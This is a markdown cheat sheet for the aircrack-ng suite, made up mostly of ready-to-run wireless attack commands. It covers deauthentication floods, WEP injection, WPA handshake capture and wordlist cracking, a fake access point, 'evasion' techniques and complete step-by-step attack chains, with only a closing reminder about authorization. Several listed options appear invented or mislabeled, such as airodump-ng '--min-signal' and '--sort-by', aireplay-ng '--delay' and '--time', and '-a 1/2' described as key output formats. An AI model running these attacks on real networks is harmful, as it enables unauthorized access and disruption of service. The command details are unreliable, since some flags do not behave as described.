# Aircrack-ng Suite Command Reference & Cheat Sheet

**Complete command reference for all aircrack-ng suite tools with practical examples**

---

## 🖥️ Monitor Mode Management

### **airmon-ng - Monitor Mode Control**

| Command | Example | Description |
|---------|---------|-------------|
| List interfaces | `airmon-ng` | Show all wireless interfaces |
| Start monitor mode | `airmon-ng start wlan0` | Enable monitor mode on wlan0 |
| Stop monitor mode | `airmon-ng stop wlan0mon` | Disable monitor mode |
| Check for conflicts | `airmon-ng check` | Find interfering processes |
| Kill conflicts | `airmon-ng check kill` | Stop conflicting processes |
| Channel setup | `airmon-ng start wlan0 6` | Start monitor mode on channel 6 |

### **Advanced Monitor Mode**
```bash
# Start monitor mode with specific MAC address
airmon-ng start wlan0 6 00:11:22:33:44:55

# Start with custom interface name
airmon-ng start wlan0 6 --name custom_mon

# Check driver capabilities
airmon-ng check wlan0
```

---

## 📡 Network Discovery & Packet Capture

### **airodump-ng - Wireless Packet Capture**

| Command | Example | Description |
|---------|---------|-------------|
| Basic scan | `airodump-ng wlan0mon` | Scan all channels |
| Target channel | `airodump-ng -c 6 wlan0mon` | Scan specific channel |
| Target BSSID | `airodump-ng -c 6 --bssid 00:11:22:33:44:55 wlan0mon` | Target specific AP |
| Save capture | `airodump-ng -w capture wlan0mon` | Save to file |
| CSV output | `airodump-ng -w scan --output-format csv wlan0mon` | CSV format output |
| Show beacons | `airodump-ng --beacons wlan0mon` | Display beacon frames |
| Hide beacons | `airodump-ng --no-beacons wlan0mon` | Hide beacon frames |

### **Advanced Capture Options**
```bash
# Capture handshake with client filter
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon

# Capture with hop interval
airodump-ng --hop-interval 250 wlan0mon

# Capture with manufacturer display
airodump-ng -M wlan0mon

# Capture with signal strength sorting
airodump-ng --sort-by signal wlan0mon

# Capture with time display
airodump-ng --localtime wlan0mon
```

### **Filtering Options**
```bash
# Filter by encryption type
airodump-ng --encrypt WPA2 wlan0mon

# Filter by signal strength
airodump-ng --min-signal -50 wlan0mon

# Filter by ESSID
airodump-ng --essid "TargetNetwork" wlan0mon

# Show only active networks
airodump-ng --active wlan0mon
```

---

## 🎯 Packet Injection & Attacks

### **aireplay-ng - Packet Injection**

| Attack Type | Command | Description |
|-------------|---------|-------------|
| Deauthentication | `aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon` | Send 5 deauth packets |
| Fake authentication | `aireplay-ng -1 0 -a 00:11:22:33:44:55 wlan0mon` | Fake authentication |
| Interactive replay | `aireplay-ng -2 -b 00:11:22:33:44:55 wlan0mon` | Interactive packet replay |
| ARP request replay | `aireplay-ng -3 -b 00:11:22:33:44:55 wlan0mon` | ARP request replay |
| Chop chop attack | `aireplay-ng -4 -b 00:11:22:33:44:55 wlan0mon` | ChopChop attack |
| Fragmentation | `aireplay-ng -5 -b 00:11:22:33:44:55 wlan0mon` | Fragmentation attack |
| Caffe latte | `aireplay-ng -6 -b 00:11:22:33:44:55 wlan0mon` | Caffe-latte attack |
| Client-to-client | `aireplay-ng -7 -b 00:11:22:33:44:55 wlan0mon` | Client-to-client attack |
| WPA migration | `aireplay-ng -8 -b 00:11:22:33:44:55 wlan0mon` | WPA migration attack |
| Injection test | `aireplay-ng -9 wlan0mon` | Test injection capability |

### **Deauthentication Attacks**
```bash
# Deauth all clients from AP
aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon

# Deauth specific client
aireplay-ng -0 5 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon

# Continuous deauth
aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon

# Deauth with reason code
aireplay-ng -0 5 -a 00:11:22:33:44:55 --reason 7 wlan0mon
```

### **WEP Attacks**
```bash
# Fake authentication (open system)
aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 00:11:22:33:44:66 wlan0mon

# Fake authentication (shared key)
aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 00:11:22:33:44:66 -e "NetworkName" wlan0mon

# ARP request replay
aireplay-ng -3 -b 00:11:22:33:44:55 -h 00:11:22:33:44:66 wlan0mon

# KoreK chopchop attack
aireplay-ng -4 -b 00:11:22:33:44:55 -h 00:11:22:33:44:66 wlan0mon
```

### **Injection Testing**
```bash
# Test injection capability
aireplay-ng -9 wlan0mon

# Test specific AP
aireplay-ng -9 -a 00:11:22:33:44:55 wlan0mon

# Test with specific interface
aireplay-ng -9 -i wlan0mon wlan0mon
```

---

## 🔓 Password Cracking & Key Recovery

### **aircrack-ng - Password Cracking**

| Command | Example | Description |
|---------|---------|-------------|
| WEP cracking | `aircrack-ng capture.cap` | Crack WEP key |
| WPA/WPA2 cracking | `aircrack-ng -w wordlist.txt capture.cap` | Crack WPA with wordlist |
| Specific BSSID | `aircrack-ng -b 00:11:22:33:44:55 capture.cap` | Target specific BSSID |
| Show networks | `aircrack-ng capture.cap` | Show captured networks |
| ASCII output | `aircrack-ng -a 1 capture.cap` | WEP ASCII key output |
| Hexadecimal | `aircrack-ng -a 2 capture.cap` | WEP hex key output |
| Combine files | `aircrack-ng *.cap` | Use multiple capture files |

### **WEP Cracking Options**
```bash
# Basic WEP cracking
aircrack-ng capture.cap

# WEP with specific key length
aircrack-ng -n 128 capture.cap

# WEP with ASCII key
aircrack-ng -a 1 capture.cap

# WEP with hexadecimal key
aircrack-ng -a 2 capture.cap

# WEP with specific BSSID
aircrack-ng -b 00:11:22:33:44:55 capture.cap
```

### **WPA/WPA2 Cracking**
```bash
# Basic WPA cracking
aircrack-ng -w wordlist.txt capture.cap

# WPA with specific BSSID
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap

# WPA with ESSID
aircrack-ng -w wordlist.txt -e "NetworkName" capture.cap

# WPA with combined wordlists
aircrack-ng -w wordlist1.txt,wordlist2.txt capture.cap

# WPA with session saving
aircrack-ng -w wordlist.txt -s session.txt capture.cap
```

### **Advanced Cracking Options**
```bash
# Use multiple CPUs/cores
aircrack-ng -w wordlist.txt -p 4 capture.cap

# Quiet mode (minimal output)
aircrack-ng -w wordlist.txt -q capture.cap

# Show only successful attempts
aircrack-ng -w wordlist.txt -l logfile.txt capture.cap

# Set maximum key length
aircrack-ng -w wordlist.txt -n 64 capture.cap
```

---

## 🔧 Utility Tools

### **airdecap-ng - Packet Decryption**

| Command | Example | Description |
|---------|---------|-------------|
| WEP decryption | `airdecap-ng -w 01:02:03:04:05 capture.cap` | Decrypt WEP packets |
| WPA decryption | `airdecap-ng -p password -e ESSID capture.cap` | Decrypt WPA packets |
| Output file | `airdecap-ng -w key -o decrypted.cap capture.cap` | Specify output file |

### **airbase-ng - Fake Access Point**

| Command | Example | Description |
|---------|---------|-------------|
| Basic AP | `airbase-ng -e "FakeAP" wlan0mon` | Create fake AP |
| WEP AP | `airbase-ng -e "FakeAP" -W 1 wlan0mon` | WEP fake AP |
| WPA AP | `airbase-ng -e "FakeAP" -z 2 wlan0mon` | WPA fake AP |
| MAC filter | `airbase-ng -e "FakeAP" -m wlan0mon` | Enable MAC filtering |

### **packetforge-ng - Packet Generation**

| Command | Example | Description |
|---------|---------|-------------|
| ARP packet | `packetforge-ng -0 -a 00:11:22:33:44:55 -h 66:77:88:99:AA:BB -k 192.168.1.1 -l 192.168.1.100 -y fragment.xor -w arp.cap` | Generate ARP packet |
| UDP packet | `packetforge-ng -1 -a 00:11:22:33:44:55 -h 66:77:88:99:AA:BB -k 192.168.1.1 -l 192.168.1.100 -y fragment.xor -w udp.cap` | Generate UDP packet |

### **airolib-ng - Rainbow Table Management**

| Command | Example | Description |
|---------|---------|-------------|
| Create database | `airolib-ng rainbow.db --create` | Create rainbow database |
| Import ESSIDs | `airolib-ng rainbow.db --import essid essids.txt` | Import ESSID list |
| Import passwords | `airolib-ng rainbow.db --import passwd passwords.txt` | Import password list |
| Generate PMKs | `airolib-ng rainbow.db --batch` | Generate PMK hashes |
| Statistics | `airolib-ng rainbow.db --stats` | Show database stats |

---

## 📊 Common Usage Patterns

### **Complete WEP Attack**
```bash
# 1. Start monitor mode
airmon-ng start wlan0

# 2. Discover networks
airodump-ng wlan0mon

# 3. Target specific network
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep_capture wlan0mon

# 4. (New terminal) Fake authentication
aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 00:11:22:33:44:66 wlan0mon

# 5. ARP request replay
aireplay-ng -3 -b 00:11:22:33:44:55 -h 00:11:22:33:44:66 wlan0mon

# 6. Crack the key
aircrack-ng wep_capture.cap
```

### **Complete WPA/WPA2 Attack**
```bash
# 1. Start monitor mode
airmon-ng start wlan0

# 2. Discover networks
airodump-ng wlan0mon

# 3. Target specific network and capture handshake
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa_capture wlan0mon

# 4. (New terminal) Deauthenticate clients
aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon

# 5. Crack with wordlist
aircrack-ng -w wordlist.txt wpa_capture.cap
```

### **Network Monitoring Setup**
```bash
# Comprehensive monitoring
airodump-ng -c 1,6,11 --hop-interval 500 -w monitor --output-format csv wlan0mon

# Channel hopping with all channels
airodump-ng --channel 1-11 --hop-interval 250 wlan0mon

# Monitor specific network continuously
airodump-ng -c 6 --bssid 00:11:22:33:44:55 --beacons --localtime wlan0mon
```

---

## 🛡️ Security & Evasion

### **Stealth Techniques**
```bash
# Random MAC address
macchanger -r wlan0mon

# Low-power injection
aireplay-ng -0 1 -a 00:11:22:33:44:55 wlan0mon

# Delayed injection
aireplay-ng -0 5 -a 00:11:22:33:44:55 --delay 1000 wlan0mon

# Specific time injection
aireplay-ng -0 5 -a 00:11:22:33:44:55 --time 30 wlan0mon
```

### **Advanced Evasion**
```bash
# Custom frame injection
aireplay-ng -9 -D wlan0mon

# Fragment size manipulation
aireplay-ng -4 -f 1500 -b 00:11:22:33:44:55 wlan0mon

# Replay with timing
aireplay-ng -2 -r replay.cap wlan0mon
```

---

## 🔍 Troubleshooting Commands

### **Interface Issues**
```bash
# Check interface status
iwconfig wlan0mon

# Reset interface
ifconfig wlan0mon down
ifconfig wlan0mon up

# Check driver
lsmod | grep -i wireless

# Reload driver
rmmod rtl8812au
modprobe rtl8812au
```

### **Injection Problems**
```bash
# Test injection
aireplay-ng -9 wlan0mon

# Check for conflicting processes
airmon-ng check

# Kill network managers
airmon-ng check kill

# Manual process killing
killall NetworkManager
killall wpa_supplicant
```

### **Capture Issues**
```bash
# Check capture files
ls -la *.cap

# Verify handshake
aircrack-ng capture.cap

# Check file integrity
file capture.cap

# Merge capture files
mergecap -w merged.cap capture1.cap capture2.cap
```

---

## 📈 Performance Optimization

### **Speed Optimization**
```bash
# Multi-threaded cracking
aircrack-ng -w wordlist.txt -p 8 capture.cap

# Optimized wordlist
aircrack-ng -w optimized.txt capture.cap

# Session management
aircrack-ng -w wordlist.txt -s session.txt capture.cap
```

### **Memory Management**
```bash
# Limit capture size
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture --write-interval 1 wlan0mon

# Rotate capture files
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture --output-format pcap wlan0mon
```

---

## 🎯 One-Liner Examples

### **Quick WEP Test**
```bash
airmon-ng start wlan0 && airodump-ng wlan0mon
```

### **Handshake Capture**
```bash
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon & sleep 5 && aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon
```

### **Quick Crack**
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt *.cap
```

### **Monitor All Channels**
```bash
airodump-ng --channel 1-11 --hop-interval 250 wlan0mon
```

---

## 📚 Common Wordlists

### **Default Locations**
```bash
# Kali Linux wordlists
/usr/share/wordlists/

# Common passwords
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt

# Custom wordlists
/usr/share/wordlists/wpa-common.txt
/usr/share/wordlists/10-million-password-list-top-1000.txt
```

### **Wordlist Generation**
```bash
# Generate custom wordlist
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 > custom.txt

# Extract passwords from capture
aircrack-ng -w - capture.cap < /dev/stdin

# Combine wordlists
cat wordlist1.txt wordlist2.txt > combined.txt
```

---

**Remember**: Always ensure you have proper authorization before testing wireless networks. Use these tools responsibly and ethically!

---

*Aircrack-ng Suite v1.7+ - Professional wireless security assessment toolkit*
